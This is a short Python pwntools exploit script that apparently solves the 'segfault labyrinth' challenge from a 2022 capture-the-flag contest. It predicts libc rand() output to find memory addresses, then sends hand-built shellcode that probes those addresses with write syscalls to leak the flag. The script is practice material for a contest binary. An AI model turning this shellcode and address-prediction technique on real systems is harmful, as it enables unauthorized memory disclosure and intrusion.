#!/usr/bin/env python3

from pwn import *
from ctypes import *

binary = context.binary = ELF('./challenge', checksec=False)

if args.REMOTE:
	p = remote('segfault-labyrinth.2022.ctfcompetition.com', 1337)
else:
	p = process(binary.path)

glibc = cdll.LoadLibrary('libc.so.6')
for i in range(9*16): glibc.rand()

sc = f'''
mov rdi, 1
mov rdx, 100
'''

for i in range(16):
	sc += f'''
	mov rsi, {hex(glibc.rand() * 0x1000 + 0x10000)}
	mov eax, {constants.SYS_write}
	syscall
	cmp rax, 100
	je end
	'''

sc += f'''
end:
xor rdi, rdi
mov eax, {constants.SYS_exit}
syscall
'''

shellcode = asm(sc)
if args.D: print(disasm(shellcode))
assert(len(shellcode) < 0x1000)
p.sendafter(b'Labyrinth\n',p64(len(shellcode)))
p.send(shellcode)
_ = p.recvline().decode().strip()
p.close()
print(_)
